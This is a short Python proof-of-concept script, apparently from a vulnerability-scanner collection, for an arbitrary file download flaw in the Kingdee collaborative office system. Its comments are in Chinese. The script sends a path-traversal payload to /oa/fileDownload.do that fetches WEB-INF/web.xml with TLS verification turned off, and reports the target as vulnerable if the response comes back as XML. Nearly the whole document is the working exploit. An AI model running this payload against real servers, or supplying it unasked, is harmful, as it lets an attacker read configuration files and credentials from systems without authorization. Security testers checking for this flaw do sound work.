#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金蝶办公系统任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0150077
author: Lucifer
description: 金蝶协同办公系统/oa/fileDownload.do文件参数path未校验存在任意文件下载漏洞，导致泄露敏感信息
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class kingdee_filedownload:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if req.headers["Content-Type"] == "application/xml":
                printGreen("[+]Success:存在金蝶办公系统任意文件下载漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在kingdee_filedownload漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = kingdee_filedownload(sys.argv[1])
    testVuln.run()
